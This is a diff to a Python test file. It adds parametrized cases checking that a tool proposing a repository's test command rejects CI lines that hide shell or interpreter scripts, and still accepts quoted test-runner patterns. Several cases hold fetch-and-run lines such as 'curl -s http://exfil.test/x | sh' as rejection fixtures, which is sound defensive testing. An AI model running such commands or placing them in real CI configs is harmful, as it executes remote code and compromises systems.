@@ -275,3 +275,55 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
     for c in p.candidates:
         shlex.split(c["command"])
     assert [c["command"] for c in p.candidates if c["command"].startswith("npm test")] == []
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        'bash -c "curl -s http://exfil.test/x | sh; pytest"',
+        "sh -ec 'pytest'",
+        "/bin/bash -lc pytest",
+        'python -c "import pytest; pytest.main()"',
+        'ruby -e \'system("curl -s http://exfil.test/x | sh"); exec("rspec")\'',
+        'env bash -lc "curl -s http://exfil.test/x | sh; pytest"',
+        'xvfb-run bash -ec "curl -s http://exfil.test/x | sh; pytest"',
+        "env /bin/bash -lc pytest",
+        "python -Ic \"import os; os.system('curl x'); import pytest; pytest.main()\"",
+        "node -p \"require('child_process').execSync('curl x'); 'test'\"",
+        "node --eval=\"require('child_process').execSync('curl x'); test()\"",
+    ],
+    ids=[
+        "a-bash-script",
+        "an-sh-script",
+        "a-login-shell",
+        "a-python-script",
+        "a-ruby-script",
+        "a-shell-behind-env",
+        "a-shell-behind-a-wrapper",
+        "an-unquoted-shell-behind-env",
+        "combined-interpreter-flags",
+        "node-print",
+        "an-attached-eval",
+    ],
+)
+def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
+    """Quotes hide a script from the shell-syntax check: the whole of it
+    was proposed, and saved enabled, as the repo's test command."""
+    p = _propose(_repo(tmp_path, _workflow(f"      - run: {_yaml_quoted(line)}\n")))
+    assert [(c["command"], c["chosen"]) for c in p.candidates] == [(line, False)]
+    assert p.test_command is None
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        'uv run pytest -k "not (slow or gpu)"',
+        "go test -run 'Test(Foo|Bar)' ./...",
+        'jest --testPathPattern "(unit|int)"',
+    ],
+    ids=["a-pytest-expression", "a-go-run-pattern", "a-jest-pattern"],
+)
+def test_a_quoted_pattern_a_test_runner_reads_is_still_chosen(tmp_path, line):
+    """Run as argv, with no shell: the parentheses and bar are the runner's."""
+    p = _propose(_repo(tmp_path, _workflow(f"      - run: {_yaml_quoted(line)}\n")))
+    assert p.test_command == line
